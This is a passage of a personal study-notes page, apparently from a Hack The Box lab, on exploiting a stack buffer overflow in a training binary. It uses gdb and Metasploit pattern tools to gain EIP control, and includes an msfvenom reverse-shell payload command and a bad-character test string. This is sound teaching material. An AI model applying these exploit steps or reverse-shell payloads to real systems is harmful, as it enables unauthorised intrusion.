<!doctype html><html lang=en><head><meta charset=utf-8><meta name=description content="This is part of a guide that you can find here.
We need to get the instruction pointer (EIP) under control so we can tell it to which address to jump."><title>Take Control of EIP</title><meta name=viewport content="width=device-width,initial-scale=1"><link rel="shortcut icon" type=ico href=https://pietraferreira.github.io/quartz//favicon.ico><link href=https://pietraferreira.github.io/quartz/styles.5c5e8e492b01ec554ac9a86fe1e7f16f.min.css rel=stylesheet><link href=https://pietraferreira.github.io/quartz/styles/_light_syntax.86a48a52faebeaaf42158b72922b1c90.min.css rel=stylesheet id=theme-link><script src=https://pietraferreira.github.io/quartz/js/darkmode.a93be4d36d657139e957880e320dd457.min.js></script>
<script src=https://pietraferreira.github.io/quartz/js/util.fa8e74b4065b97e6980a72cc472e436f.min.js></script>
<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css integrity=sha384-R4558gYOUz8mP9YWpZJjofhk+zx0AS11p36HnD2ZKj/6JR5z27gSSULCNHIRReVs crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js integrity=sha384-z1fJDqw8ZApjGO3/unPWUPsIymfsJmyrDVWC8Tv/a1HeOtGmkwNd/7xUS0Xcnvsx crossorigin=anonymous></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js integrity=sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR crossorigin=anonymous></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/contrib/copy-tex.min.js integrity=sha384-ww/583aHhxWkz5DEVn6OKtNiIaLi2iBRNZXfJRiY1Ai7tnJ9UXpEsyvOITVpTl4A crossorigin=anonymous></script>
<script src=https://unpkg.com/@floating-ui/core@0.7.3></script>
<script src=https://unpkg.com/@floating-ui/dom@0.5.4></script>
<script src=https://pietraferreira.github.io/quartz/js/popover.9b72b70bd35617d0635e9d15463662b2.min.js></script>
<script src=https://pietraferreira.github.io/quartz/js/code-title.b35124ad8db0ba37162b886afb711cbc.min.js></script>
<script src=https://pietraferreira.github.io/quartz/js/clipboard.c20857734e53a3fb733b7443879efa61.min.js></script>
<script src=https://pietraferreira.github.io/quartz/js/callouts.7723cac461d613d118ee8bb8216b9838.min.js></script>
<script>const SEARCH_ENABLED=!1,PRODUCTION=!0,BASE_URL="https://pietraferreira.github.io/quartz/",fetchData=Promise.all([fetch("https://pietraferreira.github.io/quartz/indices/linkIndex.32e0df4af5fbb5ec08f86f5b5dafac2b.min.json").then(e=>e.json()).then(e=>({index:e.index,links:e.links})),fetch("https://pietraferreira.github.io/quartz/indices/contentIndex.31a1967a3c70b5414e7d28ffa950de3c.min.json").then(e=>e.json())]).then(([{index:e,links:t},n])=>({index:e,links:t,content:n})),render=()=>{const e=new URL(BASE_URL),t=e.pathname,n=window.location.pathname,s=t==n;addCopyButtons(),addTitleToCodeBlocks(),addCollapsibleCallouts(),initPopover("https://pietraferreira.github.io/quartz",!0,!0);const o=document.getElementById("footer");if(o){const e=document.getElementById("graph-container");if(!e)return requestAnimationFrame(render);e.textContent="";const t=s&&!1;drawGraph("https://pietraferreira.github.io/quartz",t,[{"/moc":"#4388cc"}],t?{centerForce:1,depth:-1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.5,linkDistance:1,opacityScale:3,repelForce:1,scale:1.4}:{centerForce:1,depth:1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.6,linkDistance:1,opacityScale:3,repelForce:2,scale:1.2})}},init=(e=document)=>{addCopyButtons(),addTitleToCodeBlocks(),renderMathInElement(e.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}],macros:{'â€™':"'"},throwOnError:!1})}</script><script type=module>
    import { attachSPARouting } from "https:\/\/pietraferreira.github.io\/quartz\/js\/router.9d4974281069e9ebb189f642ae1e3ca2.min.js"
    attachSPARouting(init, render)
  </script></head><script async src="https://www.googletagmanager.com/gtag/js?id=G-XYFD95KB4J"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-XYFD95KB4J",{anonymize_ip:!1})}</script><body><div id=search-container><div id=search-space><input autocomplete=off id=search-bar name=search type=text aria-label=Search placeholder="Search for something..."><div id=results-container></div></div></div><script src=https://cdn.jsdelivr.net/npm/flexsearch@0.7.21/dist/flexsearch.bundle.js integrity="sha256-i3A0NZGkhsKjVMzFxv3ksk0DZh3aXqu0l49Bbh0MdjE=" crossorigin=anonymous defer></script>
<script defer src=https://pietraferreira.github.io/quartz/js/full-text-search.51f0b1753e9b30839d053f8a98cc20d1.min.js></script><div class=singlePage><header><h1 id=page-title><a href=https://pietraferreira.github.io/quartz/>ðŸª… Morioh</a></h1><div class=spacer></div><div id=search-icon><p>Search</p><svg tabindex="0" aria-labelledby="title desc" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19.9 19.7"><title id="title">Search Icon</title><desc id="desc">Icon to open search</desc><g class="search-path" fill="none"><path stroke-linecap="square" d="M18.5 18.3l-5.4-5.4"/><circle cx="8" cy="8" r="7"/></g></svg></div><div class=darkmode><input class=toggle id=darkmode-toggle type=checkbox tabindex=-1>
<label id=toggle-label-light for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="dayIcon" viewBox="0 0 35 35" style="enable-background:new 0 0 35 35"><title>Light Mode</title><path d="M6 17.5C6 16.672 5.328 16 4.5 16h-3C.672 16 0 16.672.0 17.5S.672 19 1.5 19h3C5.328 19 6 18.328 6 17.5zM7.5 26c-.414.0-.789.168-1.061.439l-2 2C4.168 28.711 4 29.086 4 29.5 4 30.328 4.671 31 5.5 31c.414.0.789-.168 1.06-.44l2-2C8.832 28.289 9 27.914 9 27.5 9 26.672 8.329 26 7.5 26zm10-20C18.329 6 19 5.328 19 4.5v-3C19 .672 18.329.0 17.5.0S16 .672 16 1.5v3C16 5.328 16.671 6 17.5 6zm10 3c.414.0.789-.168 1.06-.439l2-2C30.832 6.289 31 5.914 31 5.5 31 4.672 30.329 4 29.5 4c-.414.0-.789.168-1.061.44l-2 2C26.168 6.711 26 7.086 26 7.5 26 8.328 26.671 9 27.5 9zM6.439 8.561C6.711 8.832 7.086 9 7.5 9 8.328 9 9 8.328 9 7.5c0-.414-.168-.789-.439-1.061l-2-2C6.289 4.168 5.914 4 5.5 4 4.672 4 4 4.672 4 5.5c0 .414.168.789.439 1.06l2 2.001zM33.5 16h-3c-.828.0-1.5.672-1.5 1.5s.672 1.5 1.5 1.5h3c.828.0 1.5-.672 1.5-1.5S34.328 16 33.5 16zM28.561 26.439C28.289 26.168 27.914 26 27.5 26c-.828.0-1.5.672-1.5 1.5.0.414.168.789.439 1.06l2 2C28.711 30.832 29.086 31 29.5 31c.828.0 1.5-.672 1.5-1.5.0-.414-.168-.789-.439-1.061l-2-2zM17.5 29c-.829.0-1.5.672-1.5 1.5v3c0 .828.671 1.5 1.5 1.5s1.5-.672 1.5-1.5v-3C19 29.672 18.329 29 17.5 29zm0-22C11.71 7 7 11.71 7 17.5S11.71 28 17.5 28 28 23.29 28 17.5 23.29 7 17.5 7zm0 18c-4.136.0-7.5-3.364-7.5-7.5s3.364-7.5 7.5-7.5 7.5 3.364 7.5 7.5S21.636 25 17.5 25z"/></svg></label><label id=toggle-label-dark for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="nightIcon" viewBox="0 0 100 100" style="enable-background='new 0 0 100 100'"><title>Dark Mode</title><path d="M96.76 66.458c-.853-.852-2.15-1.064-3.23-.534-6.063 2.991-12.858 4.571-19.655 4.571C62.022 70.495 50.88 65.88 42.5 57.5 29.043 44.043 25.658 23.536 34.076 6.47c.532-1.08.318-2.379-.534-3.23-.851-.852-2.15-1.064-3.23-.534-4.918 2.427-9.375 5.619-13.246 9.491-9.447 9.447-14.65 22.008-14.65 35.369.0 13.36 5.203 25.921 14.65 35.368s22.008 14.65 35.368 14.65c13.361.0 25.921-5.203 35.369-14.65 3.872-3.871 7.064-8.328 9.491-13.246C97.826 68.608 97.611 67.309 96.76 66.458z"/></svg></label></div></header><article><h1>Take Control of EIP</h1><p class=meta>Last updated
May 11, 2023
<a href=https://github.com/jackyzha0/quartz/tree/hugo/content/notes/hacking/take-control-eip.md rel=noopener>Edit Source</a></p><ul class=tags><li><a href=https://pietraferreira.github.io/quartz/tags/hacking/>Hacking</a></li><li><a href=https://pietraferreira.github.io/quartz/tags/hacking/htb/>Hacking htb</a></li><li><a href=https://pietraferreira.github.io/quartz/tags/hacking/stack-overflow/>Hacking stack overflow</a></li></ul><aside class=mainTOC><details><summary>Table of Contents</summary><nav id=TableOfContents><ol><li><a href=#determine-the-offset>Determine the Offset</a></li><li><a href=#determine-length-for-shellcode>Determine Length for Shellcode</a></li><li><a href=#identification-of-bad-characters>Identification of Bad Characters</a></li></ol></nav></details></aside><p>This is part of a guide that you can find
<a href=/quartz/notes/hacking/htb-stack-based-overflow-linux/ rel=noopener class=internal-link data-src=/quartz/notes/hacking/htb-stack-based-overflow-linux/>here</a>.</p><p>We need to get the <strong>instruction pointer</strong> (<strong>EIP</strong>) under control so we can tell it to which address to jump. So it should point to some <strong>shellcode</strong> for example.</p><p>We first check for overflow:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>student@nix-bow:~$ gdb -q bow32
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>(</span>gdb<span class=o>)</span> run <span class=k>$(</span>python -c <span class=s2>&#34;print &#39;\x55&#39; * 1200&#34;</span><span class=k>)</span>
</span></span><span class=line><span class=cl>Starting program: /home/student/bow/bow32 <span class=k>$(</span>python -c <span class=s2>&#34;print &#39;\x55&#39; * 1200&#34;</span><span class=k>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Program received signal SIGSEGV, Segmentation fault.
</span></span><span class=line><span class=cl>0x55555555 in ?? <span class=o>()</span>
</span></span></code></pre></td></tr></table></div></div><p>If we insert 1200 &ldquo;<code>U</code>&ldquo;s (hex &ldquo;<code>55</code>&rdquo;) as input, we can see from the register information that we have overwritten the <code>EIP</code>. As far as we know, the <code>EIP</code> points to the next instruction to be executed.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>(gdb) info registers 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>eax            0x11
</span></span><span class=line><span class=cl>ecx            0xffffd6c0-10560
</span></span><span class=line><span class=cl>edx            0xffffd06f-12177
</span></span><span class=line><span class=cl>ebx            0x555555551431655765
</span></span><span class=line><span class=cl>esp            0xffffcfd00xffffcfd0
</span></span><span class=line><span class=cl>ebp            0x555555550x55555555# &lt;---- EBP overwritten
</span></span><span class=line><span class=cl>esi            0xf7fb5000-134524928
</span></span><span class=line><span class=cl>edi            0x00
</span></span><span class=line><span class=cl>eip            0x555555550x55555555# &lt;---- EIP overwritten
</span></span><span class=line><span class=cl>eflags         0x10286[ PF SF IF RF ]
</span></span><span class=line><span class=cl>cs             0x2335
</span></span><span class=line><span class=cl>ss             0x2b43
</span></span><span class=line><span class=cl>ds             0x2b43
</span></span><span class=line><span class=cl>es             0x2b43
</span></span><span class=line><span class=cl>fs             0x00
</span></span><span class=line><span class=cl>gs             0x6399
</span></span></code></pre></td></tr></table></div></div><p>If we want to imagine the process visually, then the process looks something like this:</p><p><img src=https://academy.hackthebox.com/storage/modules/31/buffer_overflow_2.png width=auto alt=image></p><p>This means that we have to write access to the EIP. This, in turn, allows specifying to which memory address the EIP should jump. However, to manipulate the register, we need an exact number of U&rsquo;s up to the EIP so that the following 4 bytes can be overwritten with our desired memory address.</p><a href=#determine-the-offset><h2 id=determine-the-offset><span class=hanchor arialabel=Anchor># </span>Determine the Offset</h2></a><p>How many bytes are needed to overwrite the buffer and how much space we have around our shellcode.</p><ul><li>Create pattern:</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Pietra@htb<span class=o>[</span>/htb<span class=o>]</span>$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <span class=m>1200</span> &gt; pattern.txt
</span></span><span class=line><span class=cl>Pietra@htb<span class=o>[</span>/htb<span class=o>]</span>$ cat pattern.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Aa0Aa1Aa2Aa3Aa4Aa5...&lt;SNIP&gt;...Bn6Bn7Bn8Bn9
</span></span></code></pre></td></tr></table></div></div><p>Now we replace our 1200 &ldquo;<code>U</code>&ldquo;s with the generated patterns and focus our attention again on the EIP.</p><ul><li>Using generated pattern:</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>(gdb) run $(python -c &#34;print &#39;Aa0Aa1Aa2Aa3Aa4Aa5...&lt;SNIP&gt;...Bn6Bn7Bn8Bn9&#39;&#34;) 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>The program being debugged has been started already.
</span></span><span class=line><span class=cl>Start it from the beginning? (y or n) y
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Starting program: /home/student/bow/bow32 $(python -c &#34;print &#39;Aa0Aa1Aa2Aa3Aa4Aa5...&lt;SNIP&gt;...Bn6Bn7Bn8Bn9&#39;&#34;)
</span></span><span class=line><span class=cl>Program received signal SIGSEGV, Segmentation fault.
</span></span><span class=line><span class=cl>0x69423569 in ?? ()
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>(gdb) info registers eip
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>eip            0x694235690x69423569
</span></span></code></pre></td></tr></table></div></div><p>We see that the <code>EIP</code> displays a different memory address, and we can use another MSF tool called &ldquo;<code>pattern_offset</code>&rdquo; to calculate the exact number of characters (offset) needed to advance to the <code>EIP</code>.</p><ul><li>Offset:</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Pietra@htb[/htb]$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>[*] Exact match at offset 1036
</span></span></code></pre></td></tr></table></div></div><p><img src=https://academy.hackthebox.com/storage/modules/31/buffer_overflow_3.png width=auto alt=image></p><p>If we now use precisely this number of bytes for our &ldquo;<code>U</code>&ldquo;s, we should land exactly on the <code>EIP</code>. To overwrite it and check if we have reached it as planned, we can add 4 more bytes with &ldquo;<code>\x66</code>&rdquo; and execute it to ensure we control the <code>EIP</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>(gdb) run $(python -c &#34;print &#39;\x55&#39; * 1036 + &#39;\x66&#39; * 4&#34;)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>The program being debugged has been started already.
</span></span><span class=line><span class=cl>Start it from the beginning? (y or n) y
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Starting program: /home/student/bow/bow32 $(python -c &#34;print &#39;\x55&#39; * 1036 + &#39;\x66&#39; * 4&#34;)
</span></span><span class=line><span class=cl>Program received signal SIGSEGV, Segmentation fault.
</span></span><span class=line><span class=cl>0x66666666 in ?? ()
</span></span></code></pre></td></tr></table></div></div><p><img src=https://academy.hackthebox.com/storage/modules/31/buffer_overflow_4.png width=auto alt=image></p><p>Now we see that we have overwritten the <code>EIP</code> with our &ldquo;<code>\x66</code>&rdquo; characters. Next, we have to find out how much space we have for our shellcode, which then executes the commands we intend. As we control the <code>EIP</code> now, we will later overwrite it with the address pointing to our shellcode&rsquo;s beginning.</p><a href=#determine-length-for-shellcode><h2 id=determine-length-for-shellcode><span class=hanchor arialabel=Anchor># </span>Determine Length for Shellcode</h2></a><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Pietra@htb<span class=o>[</span>/htb<span class=o>]</span>$ msfvenom -p linux/x86/shell_reverse_tcp <span class=nv>LHOST</span><span class=o>=</span>127.0.0.1 <span class=nv>lport</span><span class=o>=</span><span class=m>31337</span> --platform linux --arch x86 --format c
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>No encoder or badchars specified, outputting raw payload
</span></span><span class=line><span class=cl>Payload size: <span class=m>68</span> bytes
</span></span><span class=line><span class=cl>&lt;SNIP&gt;
</span></span></code></pre></td></tr></table></div></div><p>We now know that our payload will be about 68 bytes. However we should try to take a larger range in case the shellcode increases.</p><p>We can insert some <strong>no operation instruction</strong> (<strong>NOPS</strong>) before our shellcode begins so it can be executed cleanly. We need:</p><ol><li>Total of 1040 bytes to get to the <strong>EIP</strong>.</li><li>Additional <strong>100 bytes</strong> of <strong>NOPS</strong>.</li><li><strong>150 bytes</strong> for our <strong>shellcode</strong>.</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>Buffer</span> <span class=o>=</span> <span class=s2>&#34;\x55&#34;</span> * <span class=o>(</span><span class=m>1040</span> - <span class=m>100</span> - <span class=m>150</span> - 4<span class=o>)</span> <span class=o>=</span> <span class=m>786</span>
</span></span><span class=line><span class=cl><span class=nv>NOPs</span> <span class=o>=</span> <span class=s2>&#34;\x90&#34;</span> * <span class=m>100</span>
</span></span><span class=line><span class=cl><span class=nv>Shellcode</span> <span class=o>=</span> <span class=s2>&#34;\x44&#34;</span> * <span class=m>150</span>
</span></span><span class=line><span class=cl><span class=nv>EIP</span> <span class=o>=</span> <span class=s2>&#34;\x66&#34;</span> * 4<span class=err>&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=https://academy.hackthebox.com/storage/modules/31/buffer_overflow_8.png width=auto alt=image></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>gdb<span class=o>)</span> run <span class=k>$(</span>python -c <span class=s1>&#39;print &#34;\x55&#34; * (1040 - 100 - 150 - 4) + &#34;\x90&#34; * 100 + &#34;\x44&#34; * 150 + &#34;\x66&#34; * 4&#39;</span><span class=k>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>The program being debugged has been started already.
</span></span><span class=line><span class=cl>Start it from the beginning? <span class=o>(</span>y or n<span class=o>)</span> y
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Starting program: /home/student/bow/bow32 <span class=k>$(</span>python -c <span class=s1>&#39;print &#34;\x55&#34; * (1040 - 100 - 150 - 4) + &#34;\x90&#34; * 100 + &#34;\x44&#34; * 150 + &#34;\x66&#34; * 4&#39;</span><span class=k>)</span>
</span></span><span class=line><span class=cl>Program received signal SIGSEGV, Segmentation fault.
</span></span><span class=line><span class=cl>0x66666666 in ?? <span class=o>()</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=https://academy.hackthebox.com/storage/modules/31/buffer_overflow_7.png width=auto alt=image></p><a href=#identification-of-bad-characters><h2 id=identification-of-bad-characters><span class=hanchor arialabel=Anchor># </span>Identification of Bad Characters</h2></a><p>UNIX-like operating systems used to start with two bytes containing a &ldquo;<strong>magic number</strong>&rdquo; that determines the file type.</p><p>They could be:</p><ul><li><p><code>\00</code> - Null Byte</p></li><li><p><code>\0A</code> - Line Feed</p></li><li><p><code>\0D</code> - Carriage Return</p></li><li><p><code>\FF</code> - Form Feed</p></li><li><p>We can set a character list:</p></li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Pietra@htb<span class=o>[</span>/htb<span class=o>]</span>$ <span class=nv>CHARS</span><span class=o>=</span><span class=s2>&#34;\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&#34;</span>
</span></span></code></pre></td></tr></table></div></div><ul><li>Calculate length:</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Pietra@htb<span class=o>[</span>/htb<span class=o>]</span>$ <span class=nb>echo</span> <span class=nv>$CHARS</span> <span class=p>|</span> sed <span class=s1>&#39;s/\\x/ /g&#39;</span> <span class=p>|</span> wc -w
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>256</span>
</span></span></code></pre></td></tr></table></div></div><p>Therefore:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>Buffer</span> <span class=o>=</span> <span class=s2>&#34;\x55&#34;</span> * <span class=o>(</span><span class=m>1040</span> - <span class=m>256</span> - 4<span class=o>)</span> <span class=o>=</span> <span class=m>780</span>
</span></span><span class=line><span class=cl><span class=nv>CHARS</span> <span class=o>=</span> <span class=s2>&#34;\x00\x01\x02\x03\x04\x05...&lt;SNIP&gt;...\xfd\xfe\xff&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>EIP</span> <span class=o>=</span> <span class=s2>&#34;\x66&#34;</span> * <span class=m>4</span>
</span></span></code></pre></td></tr></table></div></div><p>In our <code>bow</code> example, we have to set a breakpoint at the main function so we can analyse the memory content and then send the payload:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>gdb<span class=o>)</span> <span class=nb>break</span> bowfunc 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Breakpoint <span class=m>1</span> at 0x56555551
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>gdb<span class=o>)</span> run <span class=k>$(</span>python -c <span class=s1>&#39;print &#34;\x55&#34; * (1040 - 256 - 4) + &#34;\x00\x01\x02\x03\x04\x05...&lt;SNIP&gt;...\xfc\xfd\xfe\xff&#34; + &#34;\x66&#34; * 4&#39;</span><span class=k>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Starting program: /home/student/bow/bow32 <span class=k>$(</span>python -c <span class=s1>&#39;print &#34;\x55&#34; * (1040 - 256 - 4) + &#34;\x00\x01\x02\x03\x04\x05...&lt;SNIP&gt;...\xfc\xfd\xfe\xff&#34; + &#34;\x66&#34; * 4&#39;</span><span class=k>)</span>
</span></span><span class=line><span class=cl>/bin/bash: warning: <span class=nb>command</span> substitution: ignored null byte in input
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Breakpoint 1, 0x56555551 in bowfunc <span class=o>()</span>
</span></span></code></pre></td></tr></table></div></div><p>Now we can look at the stack:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>gdb<span class=o>)</span> x/2000xb <span class=nv>$esp</span>+500
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>0xffffd28a:	0xbb	0x69	0x36	0x38	0x36	0x00	0x00	0x00
</span></span><span class=line><span class=cl>0xffffd292:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
</span></span><span class=line><span class=cl>0xffffd29a:	0x00	0x2f	0x68	0x6f	0x6d	0x65	0x2f	0x73
</span></span><span class=line><span class=cl>0xffffd2a2:	0x74	0x75	0x64	0x65	0x6e	0x74	0x2f	0x62
</span></span><span class=line><span class=cl>0xffffd2aa:	0x6f	0x77	0x2f	0x62	0x6f	0x77	0x33	0x32
</span></span><span class=line><span class=cl>0xffffd2b2:	0x00    0x55	0x55	0x55	0x55	0x55	0x55	0x55
</span></span><span class=line><span class=cl>				 <span class=c1># |---&gt; &#34;\x55&#34;s begin</span>
</span></span><span class=line><span class=cl>
